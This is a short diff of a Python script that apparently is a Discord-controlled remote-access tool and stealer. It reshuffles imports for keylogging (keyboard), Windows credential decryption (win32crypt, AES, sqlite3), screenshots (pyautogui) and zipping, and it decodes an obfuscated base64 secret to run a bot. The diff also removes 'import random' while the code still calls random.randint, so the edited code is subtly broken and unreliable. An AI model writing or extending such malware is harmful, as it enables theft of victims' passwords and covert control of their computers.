@@ -1,23 +1,19 @@
-import os
-import random
-import threading
 from time import sleep
-from zipfile import ZipFile
 import discord
+from discord.ext import commands
 import pyautogui
 import requests
-from discord.ext import commands
-from keyboard import read_event
 import base64
 import codecs
-import pyperclip
-from subprocess import call
-import sys
-import shutil
-import sqlite3
+import threading
+import os
 import json
+import sqlite3
 import win32crypt
 from Cryptodome.Cipher import AES
+from keyboard import read_event
+from subprocess import call
+from zipfile import ZipFile
 
 while True:
     try:
@@ -27,11 +23,12 @@ while True:
         hshfasudf = base64.b64decode(hshfasudf)
         hshfasudf = hshfasudf.decode('ascii')
         bot = commands.Bot(command_prefix="!")
+
         def gensesion():
             global sesja
             sesja = random.randint(1, 1000000)
             sesja = str(sesja)
-        
+
         gensesion()
 
         def get_public_ip():
